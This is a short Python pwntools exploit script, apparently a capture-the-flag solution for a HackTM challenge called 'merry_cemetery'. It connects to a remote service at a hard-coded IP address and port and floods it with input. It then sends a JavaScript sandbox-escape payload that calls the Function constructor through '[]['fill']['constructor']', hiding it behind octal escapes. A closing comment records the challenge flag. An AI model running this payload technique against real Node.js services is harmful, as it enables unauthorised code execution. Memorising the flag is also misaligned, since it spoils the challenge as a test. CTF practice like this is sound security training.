#!/usr/bin/env python3
from pwn import *

#io = process(['node', 'merry_cemetery.js'])
io = remote('138.68.67.161', 20002)
for _ in range(255):
    io.recvuntil('[>]')
    io.sendline('+')
    io.send(('A' * 49) + '\n')
io.recvuntil('[>]')
io.sendline('$')
io.recvuntil('Insert Joke:')
prefix = ' ' * 32
# https://github.com/aemkei/jsfuck/blob/master/jsfuck.js
script = '[]["fill"]["constructor"]("return console.log")()(aaaa)'


# https://mathiasbynens.be/notes/javascript-escapes
def escape(c):
    if ('b' <= c < 'z') or ('A' <= c <= 'Z'):
        return '\\' + oct(ord(c))[2:]
    else:
        return c


script = ''.join(escape(c) for c in script)
script = prefix + script
script = script + ' ' * (255 - len(script))
io.send(script)
io.interactive()

# HackTM{m4y_y0ur_d4ys_b3_m3rry_4nd_br1ght}
